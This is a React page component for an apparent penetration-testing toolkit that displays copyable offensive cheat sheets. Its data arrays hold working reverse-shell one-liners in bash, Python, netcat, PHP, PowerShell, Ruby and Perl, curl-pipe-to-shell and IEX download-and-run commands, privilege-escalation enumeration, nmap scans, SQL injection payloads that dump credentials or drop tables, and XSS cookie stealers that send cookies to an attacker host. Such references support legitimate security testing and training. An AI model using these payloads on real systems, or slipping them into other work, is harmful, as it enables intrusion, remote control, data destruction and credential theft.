import { useState } from 'react'
import { ExternalLink } from 'lucide-react'
import Card from '../components/ui/Card.jsx'
import Tabs from '../components/ui/Tabs.jsx'
import CopyButton from '../components/ui/CopyButton.jsx'

const tabs = [
  { id: 'revshells', label: 'Rev Shells' },
  { id: 'linux', label: 'Linux PrivEsc' },
  { id: 'windows', label: 'Windows PrivEsc' },
  { id: 'nmap', label: 'Nmap' },
  { id: 'sqli', label: 'SQLi' },
  { id: 'xss', label: 'XSS' },
]

const quickLinks = [
  { name: 'GTFOBins', url: 'https://gtfobins.github.io' },
  { name: 'LOLBAS', url: 'https://lolbas-project.github.io' },
  { name: 'PayloadsAllTheThings', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings' },
  { name: 'HackTricks', url: 'https://book.hacktricks.xyz' },
  { name: 'SecLists', url: 'https://github.com/danielmiessler/SecLists' },
  { name: 'RevShells', url: 'https://revshells.com' },
  { name: 'ExploitDB', url: 'https://exploit-db.com' },
]

const sections = {
  revshells: [
    { title: 'Bash TCP', cmd: 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' },
    { title: 'Bash UDP', cmd: 'bash -i >& /dev/udp/LHOST/LPORT 0>&1' },
    { title: 'Python3', cmd: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" },
    { title: 'Netcat -e', cmd: 'nc -e /bin/sh LHOST LPORT' },
    { title: 'Netcat mkfifo', cmd: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f' },
    { title: 'PHP', cmd: "php -r '$sock=fsockopen(\"LHOST\",LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
    { title: 'PowerShell', cmd: "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\"" },
    { title: 'Ruby', cmd: 'ruby -rsocket -e\'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'' },
    { title: 'Perl', cmd: 'perl -e \'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' },
  ],
  linux: [
    { title: 'Find SUID Binaries', cmd: 'find / -perm -4000 -type f 2>/dev/null' },
    { title: 'Find Writable Directories', cmd: 'find / -writable -type d 2>/dev/null' },
    { title: 'Cron Jobs', cmd: 'cat /etc/crontab && ls -la /etc/cron.*/ && crontab -l 2>/dev/null' },
    { title: 'Check sudo', cmd: 'sudo -l' },
    { title: 'Capabilities', cmd: 'getcap -r / 2>/dev/null' },
    { title: 'Kernel Version', cmd: 'uname -a && cat /proc/version' },
    { title: 'Network Info', cmd: 'ip a && netstat -tulpn 2>/dev/null || ss -tulpn' },
    { title: 'Running Processes', cmd: 'ps aux --forest' },
    { title: 'Writable /etc/passwd', cmd: 'ls -la /etc/passwd /etc/shadow 2>/dev/null' },
    { title: 'Internal Ports', cmd: 'ss -tulpn | grep LISTEN' },
    { title: 'LinPEAS', cmd: 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh' },
  ],
  windows: [
    { title: 'User Info', cmd: 'whoami /all' },
    { title: 'System Info', cmd: 'systeminfo' },
    { title: 'Network Config', cmd: 'ipconfig /all' },
    { title: 'Running Processes', cmd: 'tasklist /v' },
    { title: 'Scheduled Tasks', cmd: 'schtasks /query /fo TABLE /nh' },
    { title: 'Services', cmd: 'wmic service get name,startname,pathname' },
    { title: 'Unquoted Paths', cmd: 'wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\\Windows\\\\" |findstr /i /v """' },
    { title: 'AlwaysInstallElevated', cmd: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated' },
    { title: 'Stored Credentials', cmd: 'cmdkey /list' },
    { title: 'WinPEAS', cmd: 'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe\')"' },
  ],
  nmap: [
    { title: 'Quick Scan', cmd: 'nmap -sC -sV TARGET' },
    { title: 'Full Port Scan', cmd: 'nmap -p- --min-rate=1000 TARGET' },
    { title: 'UDP Scan', cmd: 'nmap -sU --top-ports=20 TARGET' },
    { title: 'Aggressive Scan', cmd: 'nmap -A -T4 TARGET' },
    { title: 'Vulnerability Scripts', cmd: 'nmap --script=vuln TARGET' },
    { title: 'OS Detection', cmd: 'nmap -O TARGET' },
    { title: 'Service Version', cmd: 'nmap -sV --version-intensity 5 TARGET' },
    { title: 'Stealth SYN Scan', cmd: 'nmap -sS TARGET' },
    { title: 'Subnet Scan', cmd: 'nmap -sn 10.10.10.0/24' },
    { title: 'Output All Formats', cmd: 'nmap -sC -sV -oA scan TARGET' },
  ],
  sqli: [
    { title: 'Basic Test', cmd: "' OR 1=1 --" },
    { title: 'UNION Columns', cmd: "' UNION SELECT NULL,NULL,NULL --" },
    { title: 'UNION Extract', cmd: "' UNION SELECT username,password,NULL FROM users --" },
    { title: 'Error Based', cmd: "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --" },
    { title: 'Time Based Blind', cmd: "'; IF(1=1) WAITFOR DELAY '0:0:5' --" },
    { title: 'Boolean Blind', cmd: "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' --" },
    { title: 'Stacked Queries', cmd: "'; DROP TABLE users; --" },
    { title: 'sqlmap Basic', cmd: 'sqlmap -u "http://target/page?id=1" --dbs' },
    { title: 'sqlmap Dump', cmd: 'sqlmap -u "http://target/page?id=1" -D dbname -T users --dump' },
  ],
  xss: [
    { title: 'Basic Alert', cmd: '<script>alert(1)</script>' },
    { title: 'IMG Tag', cmd: '<img src=x onerror=alert(1)>' },
    { title: 'SVG Onload', cmd: '<svg onload=alert(1)>' },
    { title: 'Event Handler', cmd: '" onfocus="alert(1)" autofocus="' },
    { title: 'JavaScript URI', cmd: 'javascript:alert(1)' },
    { title: 'Cookie Stealer', cmd: "<script>new Image().src='http://LHOST/?c='+document.cookie</script>" },
    { title: 'Fetch Exfil', cmd: "<script>fetch('http://LHOST/?c='+document.cookie)</script>" },
    { title: 'Bypass Tag Filter', cmd: '<ScRiPt>alert(1)</ScRiPt>' },
    { title: 'HTML Entity Bypass', cmd: '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;' },
    { title: 'DOM XSS', cmd: "document.location='http://LHOST/?c='+document.cookie" },
  ],
}

export default function References() {
  const [tab, setTab] = useState('revshells')

  return (
    <div className="max-w-5xl space-y-4">
      {/* Quick Links */}
      <div className="flex flex-wrap gap-1.5 mb-2">
        {quickLinks.map((link) => (
          <a
            key={link.name}
            href={link.url}
            target="_blank"
            rel="noopener noreferrer"
            className="inline-flex items-center gap-1 bg-mint/[0.06] border border-mint/[0.1] rounded-md px-2.5 py-1.5
              font-mono text-[10px] text-mint hover:bg-mint/[0.12] transition-colors no-underline"
          >
            {link.name} <ExternalLink size={10} />
          </a>
        ))}
      </div>

      <Tabs tabs={tabs} activeTab={tab} onChange={setTab} />

      <div className="space-y-2 mt-4">
        {(sections[tab] || []).map((item) => (
          <Card key={item.title}>
            <div className="flex items-start justify-between gap-4">
              <div className="flex-1 min-w-0">
                <span className="font-heading font-semibold text-[13px] text-text-secondary">{item.title}</span>
                <pre className="mt-2 bg-slime-code rounded-md p-3 font-mono text-[11px] text-mint overflow-x-auto whitespace-pre-wrap break-all">
                  {item.cmd}
                </pre>
              </div>
              <CopyButton text={item.cmd} source={`Ref: ${item.title}`} className="mt-1 shrink-0" />
            </div>
          </Card>
        ))}
      </div>
    </div>
  )
}
